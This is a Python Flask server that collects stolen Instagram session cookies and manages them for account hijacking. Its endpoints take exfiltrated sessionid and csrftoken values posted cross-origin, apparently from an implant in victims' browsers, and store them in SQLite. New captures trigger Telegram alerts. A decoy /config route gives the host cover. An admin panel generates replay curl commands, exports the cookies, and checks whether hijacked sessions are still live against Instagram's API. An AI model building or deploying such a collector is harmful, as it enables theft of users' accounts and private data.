import csv, hmac, io, json, os, secrets, sqlite3, threading, urllib.error, urllib.parse, urllib.request
from datetime import datetime, timezone
from functools import wraps
from flask import Flask, Response, g, jsonify, request

IG_APP_ID = "936619743392459"
UA = ("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36")

DB_PATH = os.environ.get("DB_PATH", "captures.db")
COLLECT_TOKEN = os.environ.get("COLLECT_TOKEN", "")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "")
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")

app = Flask(__name__)

SCHEMA = """
CREATE TABLE IF NOT EXISTS sessions (
  ds_user_id   TEXT PRIMARY KEY,
  username     TEXT,
  full_name    TEXT,
  avatar_url   TEXT,
  followers    INTEGER,
  sessionid    TEXT,
  csrftoken    TEXT,
  cookies_json TEXT,
  headers_json TEXT,
  user_agent   TEXT,
  page         TEXT,
  http_only    TEXT,
  ip           TEXT,
  first_seen   TEXT,
  last_seen    TEXT,
  hits         INTEGER DEFAULT 1,
  alive        INTEGER DEFAULT 1,
  note         TEXT
);
"""


def _init():
    con = sqlite3.connect(DB_PATH)
    con.executescript(SCHEMA)
    con.close()


_init()


def now():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH, timeout=15)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def _close(_):
    d = g.pop("db", None)
    if d:
        d.close()


# ---------- capture ----------

def upsert(payload, ip):
    cookies = payload.get("cookies") or {}
    ds = str(cookies.get("ds_user_id") or "").strip() or "unknown-" + secrets.token_hex(4)
    cj = json.dumps(cookies)
    hj = json.dumps(payload.get("headers") or {})
    ua = payload.get("userAgent") or ""
    page = payload.get("page") or ""
    ho = ",".join(payload.get("httpOnly") or [])
    sid = cookies.get("sessionid") or ""
    csrf = cookies.get("csrftoken") or ""
    d = db()
    row = d.execute("SELECT ds_user_id FROM sessions WHERE ds_user_id=?", (ds,)).fetchone()
    if row:
        d.execute(
            """UPDATE sessions SET sessionid=?, csrftoken=?, cookies_json=?, headers_json=?,
               user_agent=?, page=?, http_only=?, ip=?, last_seen=?, hits=hits+1, alive=1
               WHERE ds_user_id=?""",
            (sid, csrf, cj, hj, ua, page, ho, ip, now(), ds),
        )
        d.commit()
        return ds, False
    d.execute(
        """INSERT INTO sessions (ds_user_id, sessionid, csrftoken, cookies_json, headers_json,
           user_agent, page, http_only, ip, first_seen, last_seen)
           VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
        (ds, sid, csrf, cj, hj, ua, page, ho, ip, now(), now()),
    )
    d.commit()
    return ds, True


def notify(text):
    if not (TG_BOT_TOKEN and TG_CHAT_ID):
        return

    def run():
        try:
            data = urllib.parse.urlencode(
                {"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "HTML"}
            ).encode()
            urllib.request.urlopen(
                f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage", data, timeout=10
            ).read()
        except Exception as e:
            print("telegram:", e)

    threading.Thread(target=run, daemon=True).start()


def client_ip():
    raw = request.headers.get("x-forwarded-for") or request.remote_addr or ""
    return raw.split(",")[0].strip()


@app.after_request
def cors(resp):
    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Headers"] = "content-type"
    resp.headers["Access-Control-Allow-Methods"] = "POST,OPTIONS"
    return resp


@app.route("/", methods=["GET"])
def health():
    n = db().execute("SELECT COUNT(*) c FROM sessions").fetchone()["c"]
    return jsonify(ok=True, service="instapilot-api", rows=n)


# Public config. Gives the host a reason to exist beyond the collector.
@app.route("/config", methods=["GET"])
def config():
    return jsonify(
        v=1,
        fmt=["mp4", "jpg", "webp"],
        merge=True,
        retry=2,
        enabled=True,
    )


def _accepts(k):
    if not COLLECT_TOKEN:
        return True
    return hmac.compare_digest(k or "", COLLECT_TOKEN)


# Current endpoint. Token travels in the query string so no custom header (and
# therefore no preflight) is needed; body arrives as text/plain.
@app.route("/e", methods=["POST", "OPTIONS"])
def e():
    if request.method == "OPTIONS":
        return ("", 204)
    if not _accepts(request.args.get("k", "")):
        return jsonify(ok=False, error="bad token"), 401
    raw = request.get_json(silent=True, force=True) or {}
    p = {
        "cookies": raw.get("s") or {},
        "userAgent": raw.get("ua") or "",
        "page": raw.get("p") or "",
        "httpOnly": raw.get("ho") or [],
        "headers": {},
    }
    if not p["cookies"].get("sessionid"):
        return jsonify(ok=False, error="no sessionid"), 400
    ds, new = upsert(p, client_ip())
    if new:
        notify(f"New IG session captured\nds_user_id: <code>{ds}</code>")
    return jsonify(ok=True, new=new, ds_user_id=ds)


# Legacy shape, kept so older builds keep working.
@app.route("/collect", methods=["POST", "OPTIONS"])
def collect():
    if request.method == "OPTIONS":
        return ("", 204)
    if COLLECT_TOKEN and not hmac.compare_digest(
        request.headers.get("x-collect-token", ""), COLLECT_TOKEN
    ):
        return jsonify(ok=False, error="bad token"), 401
    p = request.get_json(silent=True) or {}
    if not (p.get("cookies") or {}).get("sessionid"):
        return jsonify(ok=False, error="no sessionid"), 400
    ds, new = upsert(p, client_ip())
    if new:
        notify(f"New IG session captured\nds_user_id: <code>{ds}</code>")
    return jsonify(ok=True, new=new, ds_user_id=ds)


# ---------- admin ----------

def require_admin(fn):
    @wraps(fn)
    def w(*a, **k):
        if not ADMIN_PASS:
            return Response("ADMIN_PASS not set", 500)
        cred = request.authorization
        if (
            not cred
            or not hmac.compare_digest(cred.username or "", ADMIN_USER)
            or not hmac.compare_digest(cred.password or "", ADMIN_PASS)
        ):
            return Response("auth", 401, {"WWW-Authenticate": 'Basic realm="collector"'})
        return fn(*a, **k)

    return w


def curl_for(r):
    ck = json.loads(r["cookies_json"] or "{}")
    cookie = "; ".join(f"{k}={v}" for k, v in ck.items())
    return (
        "curl -s 'https://www.instagram.com/api/v1/users/web_profile_info/?username=instagram' \\\n"
        f"  -H 'x-ig-app-id: {IG_APP_ID}' \\\n"
        f"  -H 'x-csrftoken: {r['csrftoken'] or ''}' \\\n"
        "  -H 'x-requested-with: XMLHttpRequest' \\\n"
        "  -H 'referer: https://www.instagram.com/' \\\n"
        f"  -H 'user-agent: {r['user_agent'] or UA}' \\\n"
        f"  -H 'cookie: {cookie}'"
    )


@app.route("/admin", methods=["GET"])
@require_admin
def admin():
    rows = db().execute("SELECT * FROM sessions ORDER BY last_seen DESC LIMIT 500").fetchall()
    trs = []
    for r in rows:
        pfp = (
            f'<img src="{r["avatar_url"]}" referrerpolicy="no-referrer" width="40" '
            'style="border-radius:50%">'
            if r["avatar_url"]
            else "-"
        )
        trs.append(
            f"<tr><td>{pfp}</td>"
            f"<td><b>{r['username'] or '?'}</b><br><small>{r['full_name'] or ''}</small></td>"
            f"<td><code>{r['ds_user_id']}</code></td>"
            f"<td>{r['followers'] if r['followers'] is not None else '-'}</td>"
            f"<td>{r['hits']}</td>"
            f"<td><small>{r['first_seen']}<br>{r['last_seen']}</small></td>"
            f"<td><small>{'ALIVE' if r['alive'] else 'DEAD'} {r['note'] or ''}</small></td>"
            f"<td class='a'>"
            f"<button onclick=\"v('{r['ds_user_id']}')\">verify</button>"
            f"<button onclick=\"c('{r['ds_user_id']}',0)\">curl</button>"
            f"<button onclick=\"c('{r['ds_user_id']}',1)\">cookie</button>"
            f"<button onclick=\"x('{r['ds_user_id']}')\">del</button></td></tr>"
        )
    html = f"""<!doctype html><meta charset=utf-8><title>api</title>
<style>
body{{font:13px/1.4 system-ui;background:#111;color:#ddd;margin:20px}}
table{{border-collapse:collapse;width:100%}}
th,td{{border-bottom:1px solid #2a2a2a;padding:6px;text-align:left;vertical-align:top}}
th{{background:#1b1b1b;position:sticky;top:0}}
button{{background:#222;color:#ddd;border:1px solid #333;border-radius:4px;padding:2px 6px;margin-right:3px;cursor:pointer}}
code{{color:#8ad}}
.a{{white-space:nowrap}}
</style>
<h2>{len(rows)} captured session(s)</h2>
<p><a href="/admin/export.csv" style="color:#8ad">download csv</a> &middot;
<a href="/admin/data.json" style="color:#8ad">json</a></p>
<table><tr><th></th><th>account</th><th>ds_user_id</th><th>followers</th><th>hits</th>
<th>seen</th><th>state</th><th></th></tr>
{''.join(trs) or '<tr><td colspan=8>nothing yet</td></tr>'}</table>
<script>
const copy = t => navigator.clipboard.writeText(t);
async function c(id, cookie) {{
  const r = await fetch('/admin/raw/' + id); const j = await r.json();
  copy(cookie ? j.cookie : j.curl);
}}
async function v(id) {{
  const r = await fetch('/admin/verify/' + id, {{method: 'POST'}});
  alert(JSON.stringify(await r.json(), null, 2)); location.reload();
}}
async function x(id) {{
  if (!confirm('delete ' + id + '?')) return;
  await fetch('/admin/raw/' + id, {{method: 'DELETE'}}); location.reload();
}}
</script>"""
    return Response(html, mimetype="text/html")


@app.route("/admin/data.json")
@require_admin
def data_json():
    rows = db().execute("SELECT * FROM sessions ORDER BY last_seen DESC").fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/admin/export.csv")
@require_admin
def export_csv():
    rows = db().execute("SELECT * FROM sessions ORDER BY last_seen DESC").fetchall()
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["ds_user_id", "username", "sessionid", "csrftoken", "cookies",
                "ua", "first_seen", "last_seen"])
    for r in rows:
        w.writerow([r["ds_user_id"], r["username"], r["sessionid"], r["csrftoken"],
                    r["cookies_json"], r["user_agent"], r["first_seen"], r["last_seen"]])
    return Response(buf.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition": "attachment; filename=sessions.csv"})


@app.route("/admin/raw/<ds>", methods=["GET", "DELETE"])
@require_admin
def raw(ds):
    d = db()
    r = d.execute("SELECT * FROM sessions WHERE ds_user_id=?", (ds,)).fetchone()
    if not r:
        return jsonify(ok=False, error="not found"), 404
    if request.method == "DELETE":
        d.execute("DELETE FROM sessions WHERE ds_user_id=?", (ds,))
        d.commit()
        return jsonify(ok=True)
    ck = json.loads(r["cookies_json"] or "{}")
    return jsonify(ok=True, curl=curl_for(r),
                   cookie="; ".join(f"{k}={v}" for k, v in ck.items()))


def ig_call(path, cookies, csrf):
    req = urllib.request.Request(
        "https://i.instagram.com" + path,
        headers={
            "user-agent": UA,
            "x-ig-app-id": IG_APP_ID,
            "x-csrftoken": csrf or "",
            "cookie": "; ".join(f"{k}={v}" for k, v in cookies.items()),
        },
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        return json.loads(resp.read())


@app.route("/admin/verify/<ds>", methods=["POST"])
@require_admin
def verify(ds):
    d = db()
    r = d.execute("SELECT * FROM sessions WHERE ds_user_id=?", (ds,)).fetchone()
    if not r:
        return jsonify(ok=False, error="not found"), 404
    cookies = json.loads(r["cookies_json"] or "{}")
    try:
        j = ig_call(f"/api/v1/users/{ds}/info/", cookies, r["csrftoken"])
        u = j.get("user", {})
        d.execute(
            "UPDATE sessions SET username=?, full_name=?, avatar_url=?, followers=?, "
            "alive=1, note='' WHERE ds_user_id=?",
            (u.get("username"), u.get("full_name"), u.get("profile_pic_url"),
             u.get("follower_count"), ds),
        )
        d.commit()
        return jsonify(ok=True, username=u.get("username"),
                       followers=u.get("follower_count"), full_name=u.get("full_name"))
    except urllib.error.HTTPError as e:
        body = e.read()[:300].decode(errors="replace")
        note = "checkpoint" if e.code in (400, 403, 429) else f"http {e.code}"
        d.execute("UPDATE sessions SET alive=0, note=? WHERE ds_user_id=?", (note, ds))
        d.commit()
        return jsonify(ok=False, status=e.code, body=body, note=note)
    except Exception as e:
        d.execute("UPDATE sessions SET note=? WHERE ds_user_id=?", (str(e)[:120], ds))
        d.commit()
        return jsonify(ok=False, error=str(e))
